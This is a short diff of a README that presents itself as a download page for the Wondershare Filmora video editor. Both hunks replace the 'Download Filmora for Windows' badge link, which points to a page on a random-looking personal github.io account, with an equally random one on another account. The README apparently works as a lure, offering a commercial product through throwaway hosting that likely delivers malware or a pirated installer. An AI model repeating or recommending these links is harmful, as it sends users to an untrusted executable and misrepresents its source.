@@ -16,7 +16,7 @@ Filmora is a Wondershare video editor for Windows that lets creators cut clips, 
 <div align="center">
   <h3>Edit smarter — turn raw footage into share-ready videos with the Wondershare Filmora video editor.</h3>
 
-  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://latonyachudyfjpek.github.io/.github/Download-Filmora-Desktop-App)
+  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://dennisharris62.github.io/.github/Download-Filmora-Desktop-App)
 
 </div>
 
@@ -94,7 +94,7 @@ For help with Filmora, open the built-in **Help** menu inside the application to
 <div align="center">
   <h3>Ready to get started with Filmora?</h3>
 
-  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://latonyachudyfjpek.github.io/.github/Download-Filmora-Desktop-App)
+  [![Download Filmora](https://img.shields.io/badge/⬇_Download_Filmora_for_Windows-2962FF?style=for-the-badge)](https://dennisharris62.github.io/.github/Download-Filmora-Desktop-App)
 
 </div>
 
